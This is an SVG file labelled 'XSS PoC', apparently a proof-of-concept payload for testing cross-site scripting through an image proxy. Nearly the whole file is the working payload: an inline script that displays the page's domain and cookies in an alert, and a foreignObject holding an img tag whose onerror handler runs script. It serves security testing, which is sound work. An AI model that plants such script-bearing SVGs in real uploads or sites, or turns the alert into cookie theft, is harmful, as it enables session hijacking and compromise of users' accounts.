<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">
  <rect width="100" height="100" fill="red"/>
  <text x="10" y="50" font-size="10" fill="white">XSS PoC</text>
  <script type="text/javascript">
    alert('XSS via image-proxy: ' + document.domain + ' | cookies: ' + document.cookie);
  </script>
  <foreignObject width="100" height="100">
    <body xmlns="http://www.w3.org/1999/xhtml">
      <img src=x onerror="alert('XSS-foreignObject: '+document.domain)"/>
    </body>
  </foreignObject>
</svg>
